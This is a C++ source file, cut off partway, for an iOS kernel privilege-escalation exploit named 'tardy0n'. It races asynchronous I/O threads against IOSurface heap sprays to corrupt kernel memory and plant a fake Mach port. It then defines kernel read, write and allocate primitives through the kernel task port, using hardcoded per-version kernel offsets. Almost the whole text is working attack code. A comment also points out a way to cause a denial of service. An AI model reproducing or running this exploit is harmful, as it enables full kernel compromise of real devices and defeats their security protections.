//
//  tardy0n.c
//  tardy0n
//
//  Created by tihmstar on 19.06.20.
//  Copyright © 2020 tihmstar. All rights reserved.
//

#include "tardy0n.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <aio.h>
#include <sys/errno.h>
#include <pthread.h>
#include <poll.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach-o/loader.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <CoreFoundation/CoreFoundation.h>

extern "C"{
#include "helpers.h"
int32_t logger_stderr(void);
int32_t logger_stdout(void);
};
#include <mutex>
#include <vector>

// ---- offsets -----

static uint64_t OFFSET_TASK_BSD_INFO = 0;
static uint64_t OFFSET_TASK_IO_USER_CLIENTS = 0;
#define OFFSET_TASK_ITK_SPACE 0x320
#define OFFSET_TASK_ITK_SELF 0x108
#define OFFSET_TASK_NEXT 0x30
#define OFFSET_TASK_MAP 0x28
#define OFFSET_IPCPORT_IP_RECEIVER 0x60
#define OFFSET_IPC_SPACE_IS_TABLE 0x20
static uint64_t OFFSET_IPC_SPACE_IS_TASK = 0;
#define OFFSET_IPC_ENTRY_IE_BITS 0x8
#define OFFSET_PROC_NEXT 0x0
#define OFFSET_PROC_TASK 0x10
#define OFFSET_PROC_PID 0x68

#define OFFSET_IPC_PORT_IO_BITS 0x00
#define OFFSET_IPC_PORT_IO_REFERENCES 0x04
#define OFFSET_IPC_PORT_IP_MSCOUNT 0x9C
#define OFFSET_IPC_PORT_IP_RECEIVER 0x60
#define OFFSET_IPC_PORT_IP_SRIGHTS 0xA0
#define OFFSET_IPC_PORT_IP_KOBJECT 0x68

#define OFFSET_IOUSERCLIENTOWNER_UC 0x18
#define OFFSET_IOUSERCLIENTOWNER_TASKLINK 0x8

#define QUEUE_NEXT 0x0
#define QUEUE_PREV 0x8

#define IPC_ENTRY_SZ 0x18

#define IE_BITS_SEND (1 << 16)
#define IE_BITS_RECEIVE (1 << 17)

#define error(a ...) do { printf(a);printf("\n");} while(0)
#define assure(a) do{ if ((a) == 0){err=__LINE__; goto error;} }while(0)
#define reterror(a ... ) {error(a); err=__LINE__; goto error;}

#define safeFree(ptr) do{if ((ptr)){ free(ptr); ptr = NULL;}} while(0)

// ********** ********** ********** IOKit ********** ********** **********

extern "C"{
    typedef mach_port_t io_service_t;
    typedef mach_port_t io_connect_t;
    extern const mach_port_t kIOMasterPortDefault;
    CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
    io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
    kern_return_t IOObjectRelease(io_service_t object);

    kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
    kern_return_t IOServiceClose(io_connect_t client);
    kern_return_t IOConnectCallScalarMethod(mach_port_t connection, uint32_t selector, const uint64_t *input, uint32_t inputCnt, uint64_t *output, uint32_t *outputCnt);
    kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
    kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
    kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);

    kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
    kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
    kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
    kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
    kern_return_t mach_vm_deallocate(mach_port_name_t target, mach_vm_address_t address, mach_vm_size_t size);

    kern_return_t IOConnectAddClient(io_connect_t a, io_connect_t b);
    kern_return_t IOConnectMapMemory64(io_connect_t connect, uint32_t memoryType, task_port_t intoTask, mach_vm_address_t *atAddress, mach_vm_size_t *ofSize, int options);
};


const uint64_t IOSURFACE_CREATE_SURFACE =  0;
const uint64_t IOSURFACE_RELEASE_SURFACE =  1;
const uint64_t IOSURFACE_SET_VALUE      =  9;
const uint64_t IOSURFACE_GET_VALUE      = 10;
const uint64_t IOSURFACE_DELETE_VALUE   = 11;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

typedef struct mach_header_64 mach_hdr_t;
typedef struct segment_command_64 mach_seg_t;
typedef uint64_t kptr_t;

#pragma pack(4)
typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    union{
        mach_msg_ool_ports_descriptor_t desc;
        mach_msg_ool_descriptor_t memdesc;
    };
    char pad[4096];
} Request;
#pragma pack()

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;//this one is refcount
    union {
        kptr_t *premsg;
    } kdata2;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount; //offset 0x28
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef union {
    struct {
        struct {
            uint64_t data;
            uint32_t reserved : 24;
            uint32_t type: 8;
            uint32_t pad;
        } lock;
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        uint64_t pad2;
        uint64_t map;
    } a;
    struct {
        char pad[OFFSET_TASK_ITK_SELF];
        uint64_t itk_self;
    } b;
} ktask_t;

#define WQT_QUEUE       0x2
#define _EVENT_MASK_BITS   ((sizeof(uint32_t) * 8) - 7)

union waitq_flags {
    struct {
        uint32_t /* flags */
    waitq_type:2,    /* only public field */
    waitq_fifo:1,    /* fifo wakeup policy? */
    waitq_prepost:1, /* waitq supports prepost? */
    waitq_irq:1,     /* waitq requires interrupts disabled */
    waitq_isvalid:1, /* waitq structure is valid */
    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
    waitq_eventmask:_EVENT_MASK_BITS;
    };
    uint32_t flags;
};


#define ANAKINTHREADS_MAX 12


#define DATA_CNT 0x40
#define SPRAYTHREADS 0x140
#define MAX_SPINTHREADS 8
//#define TRIGGERITERS 0x800

#define MACH_SPRAYTHREADS 0x110

#define REDO_SPRAY_ATTEMPTS 5

static int surface_data_id[2] = {};
static int surface_data_id_max = 0;
static io_connect_t client = 0;
static io_connect_t graphics_client = 0;
static io_connect_t graphics_shared_client = 0;
mach_vm_address_t fakePortAddr = NULL;
mach_port_t fakePort = MACH_PORT_NULL;
mach_port_t tfp0 = MACH_PORT_NULL;

kptr_t our_task = 0;
kptr_t kerntask = 0;
kptr_t ipc_space_kernel = 0;

std::vector<std::pair<uint32_t, uint32_t>> goverlapsIDs;
std::vector<std::pair<uint32_t, uint32_t>> gbadIDs;
std::vector<uint32_t> guselessIds;
std::mutex overlapLock;
volatile std::atomic<uint32_t> donethreads{0};
volatile std::atomic<uint32_t> donespray{0};
volatile int anakinSyn = 0;

volatile std::atomic<uint32_t> anakinRacer{0};

static int outFd = -1;
static int errFd = -1;
void initLoggers(){
    outFd = logger_stdout();
    errFd = logger_stderr();
}

int anakinIds[ANAKINTHREADS_MAX];
uint32_t ANAKINTHREADCNT = 0;

void *anakin(void *arg){
//    int *doRun = (int*)arg;
    uint64_t err = 0;
    int fd = 0;
    int mode = LIO_NOWAIT;
    char buf;
    void *sigp = NULL;
    
    struct aiocb aios = {};
    struct aiocb* aio = &aios;
    int *anakinID = (int *)arg;
    
    char path[0x1000] = {0};
    uint16_t randnum = mach_thread_self();
    snprintf(path, sizeof(path), "%slightspeed%u", getenv("TMPDIR"),randnum);
    
    if ((fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO))<0) {
        dprintf(errFd, "anakin error=%d\n",(int)err);
        assure(0);
    }
    
    
    aio->aio_fildes = fd;
    aio->aio_offset = 0;
    aio->aio_buf = &buf;
    aio->aio_nbytes = 1;
    aio->aio_lio_opcode = LIO_READ; // change that to LIO_NOP for a DoS :D
    aio->aio_sigevent.sigev_notify = SIGEV_NONE;
    
    ++anakinRacer;
    while (!anakinSyn);
        
    
//    for (int i=0; i<TRIGGERITERS; i++) {
    while (anakinSyn == 1){
//        for (int i=0; i<0x100; i++); // make this thread do some work, hope we get scheduled on high-performance cores
        
        lio_listio(mode, &aio, 1, (struct sigevent *)sigp);
//        while(aio_error(aio) == EINPROGRESS);
        aio_return(aio);
        
        *anakinID -= 1;
        
    }
    
error:
    if(fd >= 0)
        close(fd);
    
    return (void*)err;
}

static uint32_t transpose(uint32_t val){
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8){
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

void *getEarlySprayData(uint32_t surfaceid, uint32_t arr_count, uint32_t *spray_size){
    uint32_t dictsz_prep = (5 + 3 + arr_count * 2) * sizeof(uint32_t);
    
    uint32_t *prep_dict = (uint32_t *)malloc(dictsz_prep);
    uint32_t *prep = prep_dict;

    *(prep++) = surfaceid;
    *(prep++) = 0x0;
    *(prep++) = kOSSerializeMagic;
    *(prep++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(prep++) = kOSSerializeEndCollection | kOSSerializeDictionary | 1;
    
    *(prep++) = kOSSerializeSymbol | 4;
    *(prep++) = 0x414141;
    *(prep++) = kOSSerializeArray | kOSSerializeEndCollection | arr_count;

    static uint32_t arrid = 0;
    for (size_t k = 0; k < arr_count; ++k){
        uint32_t id = transpose(arrid++) & 0x00ffffff;
        *(prep++) = kOSSerializeSymbol | 4 | (k + 1 == arr_count ? kOSSerializeEndCollection : 0);
        *(prep++) = id;
    }

    *spray_size = dictsz_prep;
    return prep_dict;
}

void *getSprayData(uint32_t surfaceid, uint32_t spray_count, uint32_t *spray_size, uint32_t *sprayid){

    uint32_t dictsz_prep = (5 + 7 * spray_count) * sizeof(uint32_t);
    uint32_t *prep_dict = (uint32_t *)malloc(dictsz_prep);
    uint32_t *prep = prep_dict;
    
    *(prep++) = surfaceid;
    *(prep++) = 0x0;
    *(prep++) = kOSSerializeMagic;
    *(prep++) = kOSSerializeEndCollection | kOSSerializeArray | 3;
    *(prep++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_count;
    
    for(size_t j = 0; j < spray_count; ++j){
        uint32_t id = transpose((*sprayid)++) & 0x00ffffff;
        *(prep++) = kOSSerializeSymbol | 4;
        *(prep++) = id;
        *(prep++) = kOSSerializeData | 16 | (j+1 == spray_count ? kOSSerializeEndCollection : 0);
       
        *(prep++) = 0x41414141;
        *(prep++) = 0; //this must be 0
        *(prep++) = 0x69696969;
        *(prep++) = id;
    }

    *spray_size = dictsz_prep;
    return prep_dict;
}

void *getSprayData2(uint32_t surfaceid, uint32_t spray_count, uint32_t *spray_size, uint32_t *sprayid, kptr_t ptr){

    uint32_t dictsz_prep = (5 + 7 * spray_count) * sizeof(uint32_t);
    uint32_t *prep_dict = (uint32_t *)malloc(dictsz_prep);
    uint32_t *prep = prep_dict;
    
    *(prep++) = surfaceid;
    *(prep++) = 0x0;
    *(prep++) = kOSSerializeMagic;
    *(prep++) = kOSSerializeEndCollection | kOSSerializeArray | 3;
    *(prep++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_count;
    
    for(size_t j = 0; j < spray_count; ++j){
        uint32_t id = transpose((*sprayid)++) & 0x00ffffff;
        *(prep++) = kOSSerializeSymbol | 4;
        *(prep++) = id;
        *(prep++) = kOSSerializeData | 16 | (j+1 == spray_count ? kOSSerializeEndCollection : 0);
       
        
        *((uint64_t*)prep) = ptr; prep+=2;
        *((uint64_t*)prep) = 0; prep+=2;
    }

    *spray_size = dictsz_prep;
    return prep_dict;
}

void *getMachSprayData(mach_port_t rcv_port){
    int err = 0;
    Request *InP = (Request *)malloc(sizeof(Request) + sizeof(mach_port_t[2]));
    mach_port_t *myP = (mach_port_t *)(InP+1);

    mach_port_t spray_port = MACH_PORT_NULL;
    assure(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port) == 0);
    assure(mach_port_insert_right(mach_task_self(), spray_port, spray_port, MACH_MSG_TYPE_MAKE_SEND) == 0); //this is imporant for the port to keep its name

    InP->Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0, MACH_MSGH_BITS_COMPLEX);
    InP->Head.msgh_size = sizeof(mach_msg_header_t)+sizeof(mach_msg_body_t)+sizeof(mach_msg_ool_ports_descriptor_t);
    InP->Head.msgh_remote_port = rcv_port;
    InP->Head.msgh_local_port = MACH_PORT_NULL;
    InP->Head.msgh_id = 0x1337;
    
    InP->msgh_body.msgh_descriptor_count = 1;
    
    myP[1] = spray_port;
    
    InP->desc.address = myP;
    InP->desc.count = 2;
    InP->desc.deallocate = 0;
    InP->desc.disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    InP->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    return InP;
error:
    if (err) {
        dprintf(errFd, "Error: getMachSprayData = %d\n",err);
    }
    return NULL;
}


void *spinner(void * arg){
    volatile int *keepSpinning = (int*)arg;
    int someTask = 0;
    ++donethreads;
    while (*keepSpinning){
        someTask++;
    }
    return (void *)((uint64_t)spinner + someTask);
}


uint32_t sprayDictSize = 0;
volatile bool checkAnakins = true;
void *sSprayWorker(void *arg0){
    uint32_t dummy = 0;
    size_t size = sizeof(dummy);
    

    ++donethreads;

    while (anakinSyn == 0 && checkAnakins); //wait for anakin to start
    
    kern_return_t retf = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, arg0, sprayDictSize, &dummy, &size);
    if (retf) {
        dprintf(errFd, "failed to spray memory err=%d str=%s\n",retf,mach_error_string(retf));
    }
    
    if (anakinSyn){
        for (int i = 0; i < ANAKINTHREADCNT; i++){
            anakinIds[i] += 1;
        }
    }

    if (donespray.fetch_add(1) == (uint32_t)(SPRAYTHREADS*0.8)) {
        anakinSyn = 2;
    }

    return NULL;
}

void *mSprayWorker(void *arg){
    Request *InP = (Request*)arg;
    
    ++donethreads;
    
    while (anakinSyn != 1); //wait for anakin to start
    
    kern_return_t err = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_SEND_TIMEOUT, InP->Head.msgh_size, 0, 0, 5, 0);
    
    if (err) { //timeout
        dprintf(errFd, "mach_msg failed = %d (%s)!\n",err,mach_error_string(err));
    }

    return NULL;
}

void *overlapReleaseWorker(void *request){
    kern_return_t ret = 0;
    size_t rsp_sz = 4;
    size_t response = 0;
        
    while (anakinSyn != 1); //wait for anakin to start

    if ((ret = IOConnectCallStructMethod(client, IOSURFACE_DELETE_VALUE, request, 0x10, &response, &rsp_sz))){
        dprintf(errFd, "delete error ret = %d\n",ret);
        assert(0);
    }

    return NULL;
}

void findbufs(void **bufs, int bufsCnt){
    size_t response_size = 0x10000;
    kern_return_t ret = 0;
    uint32_t *response = (uint32_t *)malloc(response_size);


    for (int i=0; i<bufsCnt; i++) {
        uint32_t *prep = (uint32_t*)bufs[i];
        uint32_t surfaceid = *prep;
        prep +=4;
        uint32_t spray_count = *prep & 0x00ffffff;
        prep+=2;
        
        //search
        uint32_t request[] ={
            // Same header
            surfaceid,
            0x0,
            0, // Key
            0x0, // Null terminator
        };
        for(size_t j = 0; j < spray_count; ++j,prep+=7){
            uint32_t id = *prep;
            request[2] = id;
            size_t rsp_sz = response_size;
            if ((ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &rsp_sz))){
                dprintf(errFd, "error ret = %d\n",ret);
                assert(0);
            }

            typedef struct{
                uint64_t pad1;
                uint64_t pad2;
                uint32_t v[4];
            } __attribute__((packed)) t_sprayelement;

            t_sprayelement *elem = (t_sprayelement *)&response[0];


            if (id != elem->v[3]) {
                dprintf(outFd, "found overlapping buffer!\n");
                if (elem->v[0] == 0x41414141 && elem->v[2] == 0x69696969) {
                    dprintf(outFd, "Good candidate found!!!----------------\n");
                    overlapLock.lock();
                    goverlapsIDs.push_back({elem->v[3],id});
                    overlapLock.unlock();
                } else {
                    dprintf(errFd, "bad candidate: %d\n", id);
                    dprintf(errFd, "This is a bad candidate, expect panic :(\n");
                    overlapLock.lock();
                    gbadIDs.push_back({elem->v[3], id});
                    overlapLock.unlock();
                }
            } else {
                overlapLock.lock();
                guselessIds.push_back(id);
                overlapLock.unlock();
            }
        }
    }
    safeFree(response);
}

void freebufs(uint32_t surfaceid){
    dprintf(outFd, "[i] Freeing values...\n");
    
    uint32_t request[] ={
        // Same header
        surfaceid,
        0x0,
        0, // Key
        0x0, // Null terminator
    };
    size_t response_size = 0x10000;
    kern_return_t ret = 0;
    uint32_t *response = (uint32_t *)malloc(response_size);
    
    overlapLock.lock();
    
    for (uint32_t id : guselessIds){
        request[2] = id;
        size_t rsp_sz = 4;
        if ((ret = IOConnectCallStructMethod(client, IOSURFACE_DELETE_VALUE, request, sizeof(request), response, &rsp_sz))){
            dprintf(errFd, "delete error ret = %d\n",ret);
        }
    }
    
    guselessIds.clear();
    overlapLock.unlock();
    
    dprintf(outFd, "[i] Freed values\n");
    //sleep(1);
    safeFree(response);
}

static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}


uint32_t kread32_via_pid_for_task(kptr_t addr){
    uint32_t v;
    uint8_t *kportPage = (uint8_t*)fakePortAddr;
  
    *((uint64_t *)&kportPage[0x1000 + 0x20 + OFFSET_TASK_BSD_INFO]) = addr - OFFSET_PROC_PID;
    
    pid_for_task(fakePort, (int*)&v);
    return v;
}

uint64_t kread64_via_pid_for_task(kptr_t addr){
    uint32_t v[2];
    v[0] = kread32_via_pid_for_task(addr);
    v[1] = kread32_via_pid_for_task(addr+4);
    return *(uint64_t*)v;
}

kptr_t kalloc_via_tfp0(uint64_t size){
    kptr_t allocation;
    kern_return_t ret = mach_vm_allocate(tfp0, &allocation, size, VM_FLAGS_ANYWHERE);
    if (ret){
        dprintf(errFd, "failed to allocate: %s\n", mach_error_string(ret));
    }
    return allocation;
}

void kread_via_tfp0(kptr_t addr, void *data, size_t size){
    mach_vm_size_t sz;
    kern_return_t ret = mach_vm_read_overwrite(tfp0, addr, size, (mach_vm_address_t)data, &sz);
    if (ret || sz != size){
        dprintf(errFd, "failed to read 0x%llx: %s\n", addr, mach_error_string(ret));
    }
}

void kwrite_via_tfp0(kptr_t addr, void *data, size_t size){
    kern_return_t ret = mach_vm_write(tfp0, addr, (mach_vm_address_t)data, (mach_msg_size_t)size);
    if (ret){
        dprintf(errFd, "failed to write 0x%llx: %s\n", addr, mach_error_string(ret));
    }
}

uint32_t rk32_via_tfp0(kptr_t addr){
    uint32_t data = 0;
    kread_via_tfp0(addr, &data, sizeof(uint32_t));
    return data;
}

uint64_t rk64_via_tfp0(kptr_t addr){
    uint64_t data = 0;
    kread_via_tfp0(addr, &data, sizeof(uint64_t));
    return data;
}

void wk32_via_tfp0(kptr_t addr, uint32_t data){
    kwrite_via_tfp0(addr, &data, sizeof(uint32_t));
}

void wk64_via_tfp0(kptr_t addr, uint64_t data){
    kwrite_via_tfp0(addr, &data, sizeof(uint64_t));
}

typedef uint64_t (*read64Func)(kptr_t);
kptr_t findPort(mach_port_t port, read64Func readFunc){
    uint64_t our_ipc_space = readFunc(our_task + OFFSET_TASK_ITK_SPACE);
    uint64_t is_table = readFunc(our_ipc_space + OFFSET_IPC_SPACE_IS_TABLE);
    
    uint64_t portIdx = port >> 8;
    
    uint64_t portAddr = readFunc(is_table + (portIdx * IPC_ENTRY_SZ));
    return portAddr;
}

kptr_t findPortTfp0(mach_port_t port){
    return findPort(port, rk64_via_tfp0);
}

uint64_t dumpClients(){
    uint64_t client_addr = findPort(client, rk64_via_tfp0);
    uint64_t client_obj = rk64_via_tfp0(client_addr + OFFSET_IPC_PORT_IP_KOBJECT);
    
    uint64_t entry = 0;
    
    uint64_t queue_head = rk64_via_tfp0(our_task + OFFSET_TASK_IO_USER_CLIENTS);
    while (queue_head && (queue_head - our_task != OFFSET_TASK_IO_USER_CLIENTS)){
        
        uint64_t io_user_client = rk64_via_tfp0(queue_head + OFFSET_IOUSERCLIENTOWNER_UC);
        if (io_user_client == client_obj){
            entry = queue_head;
        }
        
        queue_head = rk64_via_tfp0(queue_head + OFFSET_IOUSERCLIENTOWNER_TASKLINK + QUEUE_NEXT);
    }
    return entry;
}

extern "C" kptr_t getOurTask(){
    return our_task;
}

extern "C" mach_port_t getTaskPort(){
    return tfp0;
}

#pragma mark exploit
extern "C" int tardy0n(){
    usleep(500 * 1000);
    initLoggers();
    
    kern_return_t ret = 0;
    int err = 0;
    io_service_t service = MACH_PORT_NULL;
    io_service_t graphics_service = MACH_PORT_NULL;
    uint8_t buf[0x1000];
    size_t size = 0;
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    void **praydata = NULL;
    uint32_t sprayID = 0;
    mach_port_t *prespray_ports = NULL;

    ANAKINTHREADCNT = 0;
    uint32_t SPINTHREADCNT = 0;
    
    qos_class_t anakinQOS = QOS_CLASS_DEFAULT;
    int anakinQOSOffset = 0;
    qos_class_t sprayQOS = QOS_CLASS_DEFAULT;
    int sprayQOSOffset = 0;
    
    pthread_t spinthreads[MAX_SPINTHREADS];
    pthread_t anakins[ANAKINTHREADS_MAX];
    pthread_t spraythreads[SPRAYTHREADS];
    pthread_t machspraythreads[MACH_SPRAYTHREADS];

    uint32_t early_surface_id = 0;
    
    uint32_t trigger_request[4] = {};
    pthread_t trigger_thread = 0;
    kptr_t leaked_port_ptr = 0;
    kptr_t spray_port_ptr = 0;
    int trycounter = 0;
    kptr_t real_port_ptr = 0;
    std::pair<uint32_t, uint32_t> leakShared{0,0};
    std::pair<uint32_t, uint32_t> leakPort{0,0};

    vm_size_t kern_page_size = 0;
    bool isArm64e = true;
    uint32_t task_zone = 0;
    
    {
        mach_port_t host = mach_host_self();
    
        ret = _host_page_size(host, &kern_page_size);
        if (ret){
            dprintf(errFd, "[-] unable to get host page size: %s\n", mach_error_string(ret));
            goto error;
        }
        dprintf(outFd, "[i] page size: 0x%lx\n", kern_page_size);
    }
    
    {
        uint32_t cpus;
        size_t sz = sizeof(uint32_t);
        
        sysctlbyname("hw.logicalcpu", &cpus, &sz, NULL, NULL);
        dprintf(outFd, "[i] CPU count: %d\n", cpus);
        
        SPINTHREADCNT = 0;
        uint32_t threads = 2;        
        if (cpus > 6){
            SPINTHREADCNT = 0;
            
            
            anakinQOS = QOS_CLASS_UTILITY;
            anakinQOSOffset = -3;
            sprayQOS = QOS_CLASS_USER_INTERACTIVE;
            sprayQOSOffset = -2;
            
            threads = cpus;
        } else if (cpus > 4){
            SPINTHREADCNT = cpus / 2;
            
            anakinQOS = QOS_CLASS_USER_INTERACTIVE;
            anakinQOSOffset = -3;
            sprayQOS = QOS_CLASS_UTILITY;
            sprayQOSOffset = -2;
            
            //threads = cpus;
        } else {
            anakinQOS = QOS_CLASS_UTILITY;
            anakinQOSOffset = -3;
            sprayQOS = QOS_CLASS_USER_INTERACTIVE;
            sprayQOSOffset = -2;
        }
        
        dprintf(outFd, "[i] using %d threads\n", threads);
        dprintf(outFd, "[i] using %d spin threads\n", SPINTHREADCNT);
        ANAKINTHREADCNT = threads;
        
        assure(ANAKINTHREADCNT <= ANAKINTHREADS_MAX);
        
        cpu_subtype_t subtype;
        sz = sizeof(cpu_subtype_t);
        sysctlbyname("hw.cpusubtype", &subtype, &sz, NULL, NULL);
        isArm64e = (subtype == CPU_SUBTYPE_ARM64E);
        
        dprintf(outFd, "[i] CPU Arch: %s\n", isArm64e ? "arm64e" : "arm64");
        
        sz = 0;
        sysctlbyname("kern.osrelease", NULL, &sz, NULL, NULL);
        char *osrelease = (char *)malloc(sz);
        sysctlbyname("kern.osrelease", osrelease, &sz, NULL, NULL);
        dprintf(outFd, "[i] Kernel Version: %s\n", osrelease);
        
        double release = atof(osrelease);
        free(osrelease);
        
        if (release >= 19.4){
            task_zone = isArm64e ? 59 : 60;
        } else {
            task_zone = isArm64e ? 57 : 58;
        }
        OFFSET_TASK_BSD_INFO = isArm64e ? 0x388 : 0x380;
        OFFSET_TASK_IO_USER_CLIENTS = isArm64e ? 0x5e8 : 0x5e0;
        OFFSET_IPC_SPACE_IS_TASK = (release >= 19.4) ? 0x30 : 0x28;
    }
    
    client = MACH_PORT_NULL;

    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    graphics_service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGraphicsAccelerator2"));
    assure(MACH_PORT_VALID(service));
    assure(MACH_PORT_VALID(graphics_service));

    assure(IOServiceOpen(service, mach_task_self(), 0, &client) == KERN_SUCCESS);

    assure(MACH_PORT_VALID(client));

    bzero(&buf, sizeof(buf));
    

    
    for (int i=0; i<sizeof(buf); i++) {
        size = i;
        if(!(ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &buf, &size))){
            goto foundsize;
        }
    }
    assert(0);
    
    sprayID = 0;
foundsize:
    early_surface_id =  *(uint32_t*)&buf[3*sizeof(mach_vm_address_t)];
    {
        uint32_t early_spray_size = 0;
        uint32_t early_dummy = 0;
        size_t early_dummy_size = sizeof(early_dummy);
        void *early_spray_data = getEarlySprayData(early_surface_id, 0x8000, &early_spray_size);
        if ((ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, early_spray_data, early_spray_size, &early_dummy, &early_dummy_size))){
            dprintf(outFd, "[-] failed to spray memory err=%d str=%s\n", ret,mach_error_string(ret));
        }
        free(early_spray_data);

        trigger_request[0] = early_surface_id;
        
        for (int i=0; i<0x8000; i+=1) {
            kern_return_t ret = 0;
            size_t rsp_sz = 4;
            size_t response = 0;
            
            if (i % 256 == 0) continue;
            
            trigger_request[2] = transpose(i);
            
            ret = IOConnectCallStructMethod(client, IOSURFACE_DELETE_VALUE, trigger_request, 0x10, &response, &rsp_sz);
            assure(!ret);
        }
        
    }

redospray:
    
    if (!leaked_port_ptr) {
        if (MACH_PORT_VALID(graphics_shared_client)) {
            IOServiceClose(graphics_shared_client); graphics_shared_client = MACH_PORT_NULL;
        }
        if (MACH_PORT_VALID(graphics_client)) {
            IOServiceClose(graphics_client); graphics_client = MACH_PORT_NULL;
        }
    }
    
    if ((leaked_port_ptr && goverlapsIDs.size() < 1) || goverlapsIDs.size() < 2) {
        
        if (trycounter == 0){
            dprintf(outFd, "[i] creating surfaces...\n");
            for (int i=0; i<1; i++) {
                bzero(&buf, size);
                
                if((ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &buf, &size))){
                    break;
                }
                //        printf("surface ID: 0x%x\n", surface.data.id);
                surface_data_id[surface_data_id_max++] = *(uint32_t*)&buf[3*sizeof(mach_vm_address_t)];
            }
        }
        
        praydata = (void **)malloc(SPRAYTHREADS*sizeof(void*));
        
        for (int i=0; i<SPRAYTHREADS; i++) {
            praydata[i] = getSprayData(surface_data_id[0], DATA_CNT, &sprayDictSize, &sprayID);
        }

        anakinSyn = 0;
        donethreads = 0;
        anakinRacer = 0;
        
        // -- START HAX --
        dprintf(outFd, "[i] starting hax...\n");
        suspend_all_threads();
        
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        sched_yield();
        
#define MIN_SPRAY ((uint32_t)(SPRAYTHREADS*0.1))
#define MIN_THREADS ((uint32_t)(SPRAYTHREADS*0.3))
        
        int keepSpinning = 0;
        
